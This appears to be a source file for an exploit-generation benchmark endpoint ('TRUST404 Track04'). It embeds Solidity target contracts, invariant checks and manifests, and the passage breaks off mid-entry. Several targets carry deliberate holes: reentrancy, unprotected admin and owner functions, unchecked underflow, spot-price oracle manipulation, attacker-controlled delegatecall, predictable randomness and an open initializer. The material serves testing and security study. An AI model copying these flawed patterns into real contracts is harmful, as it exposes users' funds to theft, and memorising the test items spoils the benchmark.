# TRUST404 Track04 — live prove endpoint (Vercel Python serverless).
# GET  /api/prove?target=<Name>   : 내장 공개셋 6개
# POST /api/prove  {contract, invariants?, manifest?, targetName?} : 임의 컨트랙트
# 실제 in-memory EVM 에서 배포->Exploit.sol 생성->실행->checkAll 재검사.
import os, json, time, re, random, warnings, traceback
warnings.filterwarnings("ignore")
# Serverless filesystems require a writable compiler cache.  Local/CLI imports
# must keep py-solc-x's normal install directory; mutating this globally at
# import time makes an already installed compiler disappear mid-run.
if os.environ.get("VERCEL") or os.environ.get("AWS_LAMBDA_FUNCTION_NAME"):
    os.environ.setdefault("SOLCX_BINARY_PATH", "/tmp/solcx-bin")
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from pathlib import Path as _Path
import sys as _sys
_ROOT = _Path(__file__).resolve().parent.parent
if str(_ROOT) not in _sys.path:
    _sys.path.insert(0, str(_ROOT))

SOLC = "0.8.24"
EVM_VERSION = "cancun"
DEFAULT_EXPLOIT_FUNDING_WEI = 10 * 10**18
DEFAULT_SEED_WEI = 10 * 10**18
MAX_SRC = 500000  # per-field source cap for custom uploads

TARGETS = {
 "ReentrantVault": {
  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice Minimal ETH vault. Users deposit ETH and withdraw their own\n/// recorded balance later. The vault also starts with some ambient float\n/// liquidity seeded at deployment.\ncontract ReentrantVault {\n    mapping(address => uint256) public balances;\n\n    event Deposited(address indexed who, uint256 amount);\n    event Withdrawn(address indexed who, uint256 amount);\n\n    constructor() payable {}\n\n    function deposit() external payable {\n        require(msg.value > 0, \"zero deposit\");\n        balances[msg.sender] += msg.value;\n        emit Deposited(msg.sender, msg.value);\n    }\n\n    function withdraw() external {\n        uint256 bal = balances[msg.sender];\n        require(bal > 0, \"no balance\");\n\n        (bool sent, ) = msg.sender.call{value: bal}(\"\");\n        require(sent, \"transfer failed\");\n\n        balances[msg.sender] = 0;\n        emit Withdrawn(msg.sender, bal);\n    }\n\n    receive() external payable {}\n}\n",
  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice Invariant predicates for ReentrantVault.\n/// Each predicate is `view` and returns true = property holds (healthy),\n/// false = property violated (attack succeeded). checkAll bundles the\n/// individual predicates in the order declared in manifest.json.\ncontract Invariants {\n    /// @dev Must match manifest.json -> deploy.value_wei for this target.\n    uint256 constant SEED = 10 ether;\n\n    /// @notice The vault must always hold at least the ETH it was seeded\n    /// with. A single honest deposit+withdraw nets to zero change, so only\n    /// a genuine accounting bug can push the balance below the seed.\n    function vaultSolvent(address target) public view returns (bool) {\n        return target.balance >= SEED;\n    }\n\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!vaultSolvent(target)) return (false, \"vaultSolvent\");\n        return (true, \"\");\n    }\n}\n",
  "manifest": {
   "schema": "trust404.track04.manifest/0.1",
   "target": {
    "name": "ReentrantVault",
    "src": "src/ReentrantVault.sol",
    "solc": "0.8.24",
    "evm_version": "cancun"
   },
   "deploy": {
    "mode": "local",
    "constructor_args": [],
    "value_wei": "10000000000000000000",
    "setup": "Setup.s.sol"
   },
   "determinism": {
    "block_number": 21000000,
    "block_timestamp": 1735689600,
    "seed": 42
   },
   "invariants": {
    "contract": "Invariants.sol",
    "predicates": [
     "vaultSolvent"
    ]
   },
   "budget": {
    "timeout_sec": 300,
    "max_attempts": 5
   }
  }
 },
 "OpenVault": {
  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice ETH vault with an administrative recovery path and an owner role.\ncontract OpenVault {\n    address public owner;\n    mapping(address => uint256) public balances;\n\n    event Deposited(address indexed who, uint256 amount);\n    event Withdrawn(address indexed who, uint256 amount);\n    event OwnerChanged(address indexed newOwner);\n\n    constructor(address initialOwner) payable {\n        owner = initialOwner;\n    }\n\n    function deposit() external payable {\n        require(msg.value > 0, \"zero deposit\");\n        balances[msg.sender] += msg.value;\n        emit Deposited(msg.sender, msg.value);\n    }\n\n    function withdraw(uint256 amount) external {\n        require(balances[msg.sender] >= amount, \"insufficient balance\");\n        balances[msg.sender] -= amount;\n\n        (bool ok, ) = msg.sender.call{value: amount}(\"\");\n        require(ok, \"transfer failed\");\n        emit Withdrawn(msg.sender, amount);\n    }\n\n    /// @notice Recovery hatch meant for the owner to rescue stuck funds.\n    function adminWithdraw(address to, uint256 amount) external {\n        (bool ok, ) = to.call{value: amount}(\"\");\n        require(ok, \"transfer failed\");\n    }\n\n    /// @notice Meant to let the owner hand off admin duties.\n    function setOwner(address newOwner) external {\n        owner = newOwner;\n        emit OwnerChanged(newOwner);\n    }\n\n    receive() external payable {}\n}\n",
  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice Invariant predicates for OpenVault.\n/// true = property holds (healthy), false = property violated.\ninterface IOpenVaultView {\n    function owner() external view returns (address);\n}\n\ncontract Invariants {\n    /// @dev Must match manifest.json -> deploy.constructor_args[0].\n    address constant EXPECTED_OWNER = address(0xA11CE);\n    /// @dev Must match manifest.json -> deploy.value_wei for this target.\n    uint256 constant SEED = 10 ether;\n\n    function ownerUnchanged(address target) public view returns (bool) {\n        return IOpenVaultView(target).owner() == EXPECTED_OWNER;\n    }\n\n    function vaultSolvent(address target) public view returns (bool) {\n        return target.balance >= SEED;\n    }\n\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!ownerUnchanged(target)) return (false, \"ownerUnchanged\");\n        if (!vaultSolvent(target)) return (false, \"vaultSolvent\");\n        return (true, \"\");\n    }\n}\n",
  "manifest": {
   "schema": "trust404.track04.manifest/0.1",
   "target": {
    "name": "OpenVault",
    "src": "src/OpenVault.sol",
    "solc": "0.8.24",
    "evm_version": "cancun"
   },
   "deploy": {
    "mode": "local",
    "constructor_args": [
     "0x00000000000000000000000000000000000a11ce"
    ],
    "value_wei": "10000000000000000000",
    "setup": "Setup.s.sol"
   },
   "determinism": {
    "block_number": 21000000,
    "block_timestamp": 1735689600,
    "seed": 42
   },
   "invariants": {
    "contract": "Invariants.sol",
    "predicates": [
     "ownerUnchanged",
     "vaultSolvent"
    ]
   },
   "budget": {
    "timeout_sec": 300,
    "max_attempts": 5
   }
  }
 },
 "BadAccounting": {
  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice Internal ETH credit ledger. Users can transfer credit to one\n/// another and redeem their own credit for ETH held by the contract.\ncontract BadAccounting {\n    mapping(address => uint256) public balanceOf;\n\n    event Transferred(address indexed from, address indexed to, uint256 amount);\n    event Redeemed(address indexed who, uint256 amount);\n\n    constructor() payable {}\n\n    function transfer(address to, uint256 amount) external {\n        unchecked {\n            balanceOf[msg.sender] -= amount;\n            balanceOf[to] += amount;\n        }\n        emit Transferred(msg.sender, to, amount);\n    }\n\n    function redeem(uint256 amount) external {\n        require(balanceOf[msg.sender] >= amount, \"insufficient credit\");\n        balanceOf[msg.sender] -= amount;\n\n        (bool ok, ) = msg.sender.call{value: amount}(\"\");\n        require(ok, \"redeem failed\");\n        emit Redeemed(msg.sender, amount);\n    }\n}\n",
  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice Invariant predicates for BadAccounting.\n/// true = property holds (healthy), false = property violated.\ncontract Invariants {\n    /// @dev Must match manifest.json -> deploy.value_wei for this target.\n    uint256 constant SEED = 10 ether;\n\n    /// @notice No one is credited any balance at deploy time, so no one can\n    /// legitimately redeem anything yet. The contract's ETH balance must\n    /// therefore never drop below the seed float.\n    function vaultSolvent(address target) public view returns (bool) {\n        return target.balance >= SEED;\n    }\n\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!vaultSolvent(target)) return (false, \"vaultSolvent\");\n        return (true, \"\");\n    }\n}\n",
  "manifest": {
   "schema": "trust404.track04.manifest/0.1",
   "target": {
    "name": "BadAccounting",
    "src": "src/BadAccounting.sol",
    "solc": "0.8.24",
    "evm_version": "cancun"
   },
   "deploy": {
    "mode": "local",
    "constructor_args": [],
    "value_wei": "10000000000000000000",
    "setup": "Setup.s.sol"
   },
   "determinism": {
    "block_number": 21000000,
    "block_timestamp": 1735689600,
    "seed": 42
   },
   "invariants": {
    "contract": "Invariants.sol",
    "predicates": [
     "vaultSolvent"
    ]
   },
   "budget": {
    "timeout_sec": 300,
    "max_attempts": 5
   }
  }
 },
 "NaiveOracle": {
  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice Minimal mintable ERC20-like token used only inside this target.\n/// `mint` is restricted to the single address that deployed it.\ncontract Token {\n    string public name;\n    string public symbol;\n    uint8 public constant decimals = 18;\n\n    address public immutable minter;\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    constructor(string memory _name, string memory _symbol) {\n        name = _name;\n        symbol = _symbol;\n        minter = msg.sender;\n    }\n\n    function mint(address to, uint256 amount) external {\n        require(msg.sender == minter, \"not minter\");\n        totalSupply += amount;\n        balanceOf[to] += amount;\n        emit Transfer(address(0), to, amount);\n    }\n\n    function approve(address spender, uint256 amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transfer(address to, uint256 amount) external returns (bool) {\n        _transfer(msg.sender, to, amount);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint256 amount) external returns (bool) {\n        uint256 allowed = allowance[from][msg.sender];\n        require(allowed >= amount, \"allowance exceeded\");\n        if (allowed != type(uint256).max) {\n            allowance[from][msg.sender] = allowed - amount;\n        }\n        _transfer(from, to, amount);\n        return true;\n    }\n\n    function _transfer(address from, address to, uint256 amount) internal {\n        require(balanceOf[from] >= amount, \"insufficient balance\");\n        balanceOf[from] -= amount;\n        balanceOf[to] += amount;\n        emit Transfer(from, to, amount);\n    }\n}\n\n/// @notice Thin constant-product spot-price pool. Anyone can swap; there is\n/// no fee and no external price feed, so the spot price simply reflects\n/// whatever the current on-chain reserves are.\ncontract Pool {\n    Token public col;\n    Token public bor;\n    uint256 public reserveCol;\n    uint256 public reserveBor;\n\n    constructor(Token _col, Token _bor) {\n        col = _col;\n        bor = _bor;\n    }\n\n    function sync() external {\n        reserveCol = col.balanceOf(address(this));\n        reserveBor = bor.balanceOf(address(this));\n    }\n\n    /// @return price of 1 COL expressed in BOR, scaled by 1e18.\n    function spotPrice() external view returns (uint256) {\n        require(reserveCol > 0, \"no liquidity\");\n        return (reserveBor * 1e18) / reserveCol;\n    }\n\n    function swapColForBor(uint256 colIn) external {\n        col.transferFrom(msg.sender, address(this), colIn);\n        uint256 borOut = (reserveBor * colIn) / (reserveCol + colIn);\n        reserveCol += colIn;\n        reserveBor -= borOut;\n        bor.transfer(msg.sender, borOut);\n    }\n\n    function swapBorForCol(uint256 borIn) external {\n        bor.transferFrom(msg.sender, address(this), borIn);\n        uint256 colOut = (reserveCol * borIn) / (reserveBor + borIn);\n        reserveBor += borIn;\n        reserveCol -= colOut;\n        col.transfer(msg.sender, colOut);\n    }\n}\n\n/// @notice Collateralized lending desk that prices collateral off the\n/// `Pool`'s live spot price with no averaging, staleness check, or bound.\ncontract NaiveOracle {\n    Token public collateralToken;\n    Token public borrowToken;\n    Pool public pool;\n\n    uint256 public totalCollateral;\n    uint256 public totalDebt;\n    mapping(address => uint256) public collateralOf;\n    mapping(address => uint256) public debtOf;\n\n    event Deposited(address indexed who, uint256 amount);\n    event Borrowed(address indexed who, uint256 amount);\n\n    constructor() payable {\n        collateralToken = new Token(\"Collateral\", \"COL\");\n        borrowToken = new Token(\"Borrow\", \"BOR\");\n        pool = new Pool(collateralToken, borrowToken);\n\n        // Thin starting liquidity: 1 COL == 1 BOR.\n        collateralToken.mint(address(pool), 100e18);\n        borrowToken.mint(address(pool), 100e18);\n        pool.sync();\n\n        // Fund the lending desk so it can pay out borrows.\n        borrowToken.mint(address(this), 1_000_000e18);\n    }\n\n    /// @notice Test faucet so anyone can try the protocol without an\n    /// external funding source.\n    function faucet() external {\n        borrowToken.mint(msg.sender, 1_000e18);\n    }\n\n    function depositCollateral(uint256 amount) external {\n        collateralToken.transferFrom(msg.sender, address(this), amount);\n        collateralOf[msg.sender] += amount;\n        totalCollateral += amount;\n        emit Deposited(msg.sender, amount);\n    }\n\n    function borrow(uint256 amount) external {\n        uint256 price = pool.spotPrice();\n        uint256 value = (collateralOf[msg.sender] * price) / 1e18;\n        require(debtOf[msg.sender] + amount <= value, \"exceeds collateral value\");\n\n        debtOf[msg.sender] += amount;\n        totalDebt += amount;\n        borrowToken.transfer(msg.sender, amount);\n        emit Borrowed(msg.sender, amount);\n    }\n}\n",
  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice Invariant predicates for NaiveOracle.\n/// true = property holds (healthy), false = property violated.\ninterface INaiveOracleView {\n    function totalCollateral() external view returns (uint256);\n    function totalDebt() external view returns (uint256);\n}\n\ncontract Invariants {\n    /// @dev Ground-truth reference price (1 COL == 1 BOR), independent of\n    /// whatever the target's own pool currently reports.\n    uint256 constant FAIR_PRICE = 1e18;\n\n    /// @notice Outstanding debt must never exceed the fair value of the\n    /// collateral actually deposited.\n    function protocolSolvent(address target) public view returns (bool) {\n        INaiveOracleView t = INaiveOracleView(target);\n        return t.totalDebt() <= (t.totalCollateral() * FAIR_PRICE) / 1e18;\n    }\n\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!protocolSolvent(target)) return (false, \"protocolSolvent\");\n        return (true, \"\");\n    }\n}\n",
  "manifest": {
   "schema": "trust404.track04.manifest/0.1",
   "target": {
    "name": "NaiveOracle",
    "src": "src/NaiveOracle.sol",
    "solc": "0.8.24",
    "evm_version": "cancun"
   },
   "deploy": {
    "mode": "local",
    "constructor_args": [],
    "value_wei": "0"
   },
   "determinism": {
    "block_number": 21000000,
    "block_timestamp": 1735689600,
    "seed": 42
   },
   "invariants": {
    "contract": "Invariants.sol",
    "predicates": [
     "protocolSolvent"
    ]
   },
   "budget": {
    "timeout_sec": 600,
    "max_attempts": 8
   }
  }
 },
 "SafeVault": {
  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice ETH vault with checks-effects-interactions ordering and a\n/// reentrancy guard on withdrawal.\ncontract SafeVault {\n    mapping(address => uint256) public balances;\n    uint256 private locked = 1;\n\n    event Deposited(address indexed who, uint256 amount);\n    event Withdrawn(address indexed who, uint256 amount);\n\n    modifier nonReentrant() {\n        require(locked == 1, \"reentrant call\");\n        locked = 2;\n        _;\n        locked = 1;\n    }\n\n    constructor() payable {}\n\n    function deposit() external payable {\n        require(msg.value > 0, \"zero deposit\");\n        balances[msg.sender] += msg.value;\n        emit Deposited(msg.sender, msg.value);\n    }\n\n    function withdraw() external nonReentrant {\n        uint256 bal = balances[msg.sender];\n        require(bal > 0, \"no balance\");\n\n        balances[msg.sender] = 0;\n\n        (bool sent, ) = msg.sender.call{value: bal}(\"\");\n        require(sent, \"transfer failed\");\n        emit Withdrawn(msg.sender, bal);\n    }\n\n    receive() external payable {}\n}\n",
  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice Invariant predicates for SafeVault.\n/// true = property holds (healthy), false = property violated.\ncontract Invariants {\n    /// @dev Must match manifest.json -> deploy.value_wei for this target.\n    uint256 constant SEED = 10 ether;\n\n    function vaultSolvent(address target) public view returns (bool) {\n        return target.balance >= SEED;\n    }\n\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!vaultSolvent(target)) return (false, \"vaultSolvent\");\n        return (true, \"\");\n    }\n}\n",
  "manifest": {
   "schema": "trust404.track04.manifest/0.1",
   "target": {
    "name": "SafeVault",
    "src": "src/SafeVault.sol",
    "solc": "0.8.24",
    "evm_version": "cancun"
   },
   "deploy": {
    "mode": "local",
    "constructor_args": [],
    "value_wei": "10000000000000000000",
    "setup": "Setup.s.sol"
   },
   "determinism": {
    "block_number": 21000000,
    "block_timestamp": 1735689600,
    "seed": 42
   },
   "invariants": {
    "contract": "Invariants.sol",
    "predicates": [
     "vaultSolvent"
    ]
   },
   "budget": {
    "timeout_sec": 300,
    "max_attempts": 5
   }
  }
 },
 "BoundedOwner": {
  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice Treasury where the owner can move funds only through a capped,\n/// time-locked proposal: at most 10% of the current balance per proposal,\n/// and only after a 2-day delay has passed.\ncontract BoundedOwner {\n    address public owner;\n    uint256 public constant MAX_WITHDRAW_BPS = 1000; // 10%\n    uint256 public constant TIMELOCK_DELAY = 2 days;\n\n    struct Proposal {\n        address to;\n        uint256 amount;\n        uint256 executeAfter;\n        bool executed;\n    }\n\n    mapping(uint256 => Proposal) public proposals;\n    uint256 public proposalCount;\n\n    event Proposed(uint256 indexed id, address to, uint256 amount, uint256 executeAfter);\n    event Executed(uint256 indexed id);\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"not owner\");\n        _;\n    }\n\n    constructor(address initialOwner) payable {\n        owner = initialOwner;\n    }\n\n    function propose(address to, uint256 amount) external onlyOwner returns (uint256 id) {\n        require(amount <= (address(this).balance * MAX_WITHDRAW_BPS) / 10000, \"over cap\");\n        id = proposalCount++;\n        uint256 executeAfter = block.timestamp + TIMELOCK_DELAY;\n        proposals[id] = Proposal({to: to, amount: amount, executeAfter: executeAfter, executed: false});\n        emit Proposed(id, to, amount, executeAfter);\n    }\n\n    function execute(uint256 id) external onlyOwner {\n        Proposal storage p = proposals[id];\n        require(!p.executed, \"already executed\");\n        require(block.timestamp >= p.executeAfter, \"timelocked\");\n        p.executed = true;\n\n        (bool ok, ) = p.to.call{value: p.amount}(\"\");\n        require(ok, \"transfer failed\");\n        emit Executed(id);\n    }\n\n    receive() external payable {}\n}\n",
  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice Invariant predicates for BoundedOwner.\n/// true = property holds (healthy), false = property violated.\ninterface IBoundedOwnerView {\n    function owner() external view returns (address);\n}\n\ncontract Invariants {\n    /// @dev Must match manifest.json -> deploy.constructor_args[0].\n    address constant EXPECTED_OWNER = address(0xA11CE);\n    /// @dev Must match manifest.json -> deploy.value_wei for this target.\n    uint256 constant SEED = 10 ether;\n\n    function ownerUnchanged(address target) public view returns (bool) {\n        return IBoundedOwnerView(target).owner() == EXPECTED_OWNER;\n    }\n\n    function vaultSolvent(address target) public view returns (bool) {\n        return target.balance >= SEED;\n    }\n\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!ownerUnchanged(target)) return (false, \"ownerUnchanged\");\n        if (!vaultSolvent(target)) return (false, \"vaultSolvent\");\n        return (true, \"\");\n    }\n}\n",
  "manifest": {
   "schema": "trust404.track04.manifest/0.1",
   "target": {
    "name": "BoundedOwner",
    "src": "src/BoundedOwner.sol",
    "solc": "0.8.24",
    "evm_version": "cancun"
   },
   "deploy": {
    "mode": "local",
    "constructor_args": [
     "0x00000000000000000000000000000000000a11ce"
    ],
    "value_wei": "10000000000000000000",
    "setup": "Setup.s.sol"
   },
   "determinism": {
    "block_number": 21000000,
    "block_timestamp": 1735689600,
    "seed": 42
   },
   "invariants": {
    "contract": "Invariants.sol",
    "predicates": [
     "ownerUnchanged",
     "vaultSolvent"
    ]
   },
   "budget": {
    "timeout_sec": 300,
    "max_attempts": 5
   }
  }
 },
 "DelegateVault": {
  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice A \"modular\" vault that lets callers plug in behaviour by\n/// delegatecalling an arbitrary module address they supply. Because the\n/// module runs in THIS contract's storage context, a malicious module can\n/// overwrite `owner` (storage slot 0). Modelled on Ethernaut Delegation /\n/// Preservation and the Parity multisig delegatecall class.\ncontract DelegateVault {\n    address public owner;      // slot 0\n    uint256 public deposits;   // slot 1\n\n    constructor() payable {\n        owner = address(0xA11CE);\n    }\n\n    /// @dev VULNERABLE: module address is fully attacker-controlled and is\n    /// invoked with delegatecall, so its code mutates DelegateVault storage.\n    function execute(address module, bytes calldata data) external {\n        (bool ok, ) = module.delegatecall(data);\n        require(ok, \"module call failed\");\n    }\n\n    function deposit() external payable {\n        deposits += msg.value;\n    }\n\n    receive() external payable {}\n}\n",
  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice true = property holds (healthy), false = violated.\ninterface IOwned { function owner() external view returns (address); }\n\ncontract Invariants {\n    address constant INITIAL_OWNER = address(0xA11CE);\n\n    /// @notice Ownership must remain with the address set at construction.\n    function ownerUnchanged(address target) public view returns (bool) {\n        return IOwned(target).owner() == INITIAL_OWNER;\n    }\n\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!ownerUnchanged(target)) return (false, \"ownerUnchanged\");\n        return (true, \"\");\n    }\n}\n",
  "manifest": {
   "schema": "trust404.track04.manifest/0.1",
   "target": {
    "name": "DelegateVault",
    "src": "src/DelegateVault.sol",
    "solc": "0.8.24",
    "evm_version": "cancun"
   },
   "deploy": {
    "mode": "local",
    "constructor_args": [],
    "value_wei": "1000000000000000000"
   },
   "determinism": {
    "block_number": 21000000,
    "block_timestamp": 1735689600,
    "seed": 42
   },
   "invariants": {
    "contract": "Invariants.sol",
    "predicates": [
     "ownerUnchanged"
    ]
   },
   "budget": {
    "timeout_sec": 300,
    "max_attempts": 6
   }
  }
 },
 "PredictableLottery": {
  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice A lottery whose \"random\" winning number is derived entirely from\n/// on-chain block fields readable by any caller in the SAME transaction.\n/// An attacker computes the identical value and always wins. Modelled on\n/// Ethernaut CoinFlip and Capture-the-Ether \"Predict the Future\".\ncontract PredictableLottery {\n    constructor() payable {}\n\n    /// @dev VULNERABLE: entropy source is block.timestamp/prevrandao/number,\n    /// all known to the caller before they pick `guess`.\n    function play(uint256 guess) external payable {\n        require(msg.value == 1 ether, \"ante is 1 ether\");\n        uint256 lucky = uint256(\n            keccak256(abi.encodePacked(block.timestamp, block.prevrandao, block.number))\n        ) % 100;\n        if (guess == lucky) {\n            (bool ok, ) = msg.sender.call{value: 5 ether}(\"\");\n            require(ok, \"payout failed\");\n        }\n    }\n\n    receive() external payable {}\n}\n",
  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\ncontract Invariants {\n    uint256 constant SEED = 20 ether;\n    /// @notice The house must always retain at least its seeded float. A\n    /// fair game nets to zero for the house; only a predictable-RNG drain\n    /// can push it below the seed.\n    function houseSolvent(address target) public view returns (bool) {\n        return target.balance >= SEED;\n    }\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!houseSolvent(target)) return (false, \"houseSolvent\");\n        return (true, \"\");\n    }\n}\n",
  "manifest": {
   "schema": "trust404.track04.manifest/0.1",
   "target": {
    "name": "PredictableLottery",
    "src": "src/PredictableLottery.sol",
    "solc": "0.8.24",
    "evm_version": "cancun"
   },
   "deploy": {
    "mode": "local",
    "constructor_args": [],
    "value_wei": "20000000000000000000"
   },
   "determinism": {
    "block_number": 21000000,
    "block_timestamp": 1735689600,
    "seed": 42
   },
   "invariants": {
    "contract": "Invariants.sol",
    "predicates": [
     "houseSolvent"
    ]
   },
   "budget": {
    "timeout_sec": 300,
    "max_attempts": 6
   }
  }
 },
 "OpenInitializer": {
  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice A logic contract whose admin slot is left uninitialized at\n/// construction and can be claimed by ANYONE via an unguarded initializer.\n/// Modelled on Ethernaut Motorbike (uninitialized UUPS) and the broad class\n/// of proxy contracts deployed without initialize() being locked.\ncontract OpenInitializer {\n    address public admin;   // slot 0 \u2014 starts as address(0)\n\n    constructor() payable {}\n\n    /// @dev VULNERABLE: no `initialized` guard, no access control. The first\n    /// caller becomes admin.\n    function initialize() external {\n        admin = msg.sender;\n    }\n\n    /// @dev Once admin, sweep the whole balance.\n    function sweep(address payable to) external {\n        require(msg.sender == admin, \"not admin\");\n        (bool ok, ) = to.call{value: address(this).balance}(\"\");\n        require(ok, \"sweep failed\");\n    }\n\n    receive() external payable {}\n}\n",
  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\ninterface IAdmin { function admin() external view returns (address); }\n\ncontract Invariants {\n    /// @notice The admin slot must remain uninitialized until the legitimate\n    /// deployer claims it. Any other address seizing it is a takeover.\n    function adminUninitialized(address target) public view returns (bool) {\n        return IAdmin(target).admin() == address(0);\n    }\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!adminUninitialized(target)) return (false, \"adminUninitialized\");\n        return (true, \"\");\n    }\n}\n",
  "manifest": {
   "schema": "trust404.track04.manifest/0.1",
   "target": {
    "name": "OpenInitializer",
    "src": "src/OpenInitializer.sol",
    "solc": "0.8.24",
    "evm_version": "cancun"
   },
   "deploy": {
    "mode": "local",
    "constructor_args": [],
    "value_wei": "1000000000000000000"
   },
   "determinism": {
    "block_number": 21000000,
    "block_timestamp": 1735689600,
    "seed": 42
   },
   "invariants": {
    "contract": "Invariants.sol",
    "predicates": [
     "adminUninitialized"
    ]
   },
   "budget": {
    "timeout_sec": 300,
    "max_attempts": 6
   }
  }
 },
 "LibraryVault": {
  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice Fixed logic module. Its storage layout is deliberately aligned with\n/// LibraryVault: slot 0 mirrors `owner` and is never written here, while the\n/// counter lives at slot 1. A delegatecall into ping() therefore can only ever\n/// touch slot 1, never the vault's owner slot.\ncontract Logic {\n    address private _ownerSlot; // slot 0 \u2014 mirrors LibraryVault.owner; never written\n    uint256 public pings;       // slot 1\n    function ping() external { pings += 1; }\n}\n\n/// @notice SAFE counterpart to DelegateVault. It also uses delegatecall, but\n/// only ever to an IMMUTABLE module fixed at construction whose storage layout\n/// is aligned with this contract. Callers cannot point it at attacker code, and\n/// the module never writes the owner slot, so ownership cannot be hijacked.\ncontract LibraryVault {\n    address public owner;             // slot 0\n    uint256 public pings;             // slot 1 \u2014 bumped by the module\n    address public immutable module;  // immutable \u2192 not attacker-controlled, no slot\n\n    constructor() payable {\n        owner = address(0xA11CE);\n        module = address(new Logic());\n    }\n\n    /// @dev delegatecall target is the fixed `module`, never a parameter, and\n    /// the module only ever writes slot 1 (pings), never slot 0 (owner).\n    function run(bytes calldata data) external {\n        (bool ok, ) = module.delegatecall(data);\n        require(ok, \"module call failed\");\n    }\n\n    receive() external payable {}\n}\n",
  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\ninterface IOwned { function owner() external view returns (address); }\n\ncontract Invariants {\n    address constant INITIAL_OWNER = address(0xA11CE);\n    function ownerUnchanged(address target) public view returns (bool) {\n        return IOwned(target).owner() == INITIAL_OWNER;\n    }\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!ownerUnchanged(target)) return (false, \"ownerUnchanged\");\n        return (true, \"\");\n    }\n}\n",
  "manifest": {
   "schema": "trust404.track04.manifest/0.1",
   "target": {
    "name": "LibraryVault",
    "src": "src/LibraryVault.sol",
    "solc": "0.8.24",
    "evm_version": "cancun"
   },
   "deploy": {
    "mode": "local",
    "constructor_args": [],
    "value_wei": "1000000000000000000"
   },
   "determinism": {
    "block_number": 21000000,
    "block_timestamp": 1735689600,
    "seed": 42
   },
   "invariants": {
    "contract": "Invariants.sol",
    "predicates": [
     "ownerUnchanged"
    ]
   },
   "budget": {
    "timeout_sec": 300,
    "max_attempts": 6
   }
  }
 },
 "CommitLottery": {
  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice SAFE counterpart to PredictableLottery. The winning condition is a\n/// pre-committed secret hash, NOT any block field. A caller cannot derive the\n/// secret from on-chain state within the transaction, so there is no\n/// predictable-RNG edge to exploit (commit-reveal pattern).\ncontract CommitLottery {\n    // Hash of the house's secret, fixed at deploy. Preimage is off-chain.\n    bytes32 public constant COMMITMENT =\n        0x9d3e2b1f4c7a86d05e21bb90f7c4c0a3d8e6f1b2c9a4d7e0f3b6c1a2d5e8f0b7;\n\n    constructor() payable {}\n\n    /// @dev No block.timestamp / prevrandao / blockhash anywhere: the payout\n    /// gate is a hash preimage check, unpredictable on-chain.\n    function claim(uint256 secret) external {\n        require(keccak256(abi.encodePacked(secret)) == COMMITMENT, \"wrong secret\");\n        (bool ok, ) = msg.sender.call{value: 5 ether}(\"\");\n        require(ok, \"payout failed\");\n    }\n\n    receive() external payable {}\n}\n",
  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\ncontract Invariants {\n    uint256 constant SEED = 20 ether;\n    function houseSolvent(address target) public view returns (bool) {\n        return target.balance >= SEED;\n    }\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!houseSolvent(target)) return (false, \"houseSolvent\");\n        return (true, \"\");\n    }\n}\n",
  "manifest": {
   "schema": "trust404.track04.manifest/0.1",
   "target": {
    "name": "CommitLottery",
    "src": "src/CommitLottery.sol",
    "solc": "0.8.24",
    "evm_version": "cancun"
   },
   "deploy": {
    "mode": "local",
    "constructor_args": [],
    "value_wei": "20000000000000000000"
   },
   "determinism": {
    "block_number": 21000000,
    "block_timestamp": 1735689600,
    "seed": 42
   },
   "invariants": {
    "contract": "Invariants.sol",
    "predicates": [
     "houseSolvent"
    ]
   },
   "budget": {
    "timeout_sec": 300,
    "max_attempts": 6
   }
  }
 },
 "GuardedInitializer": {
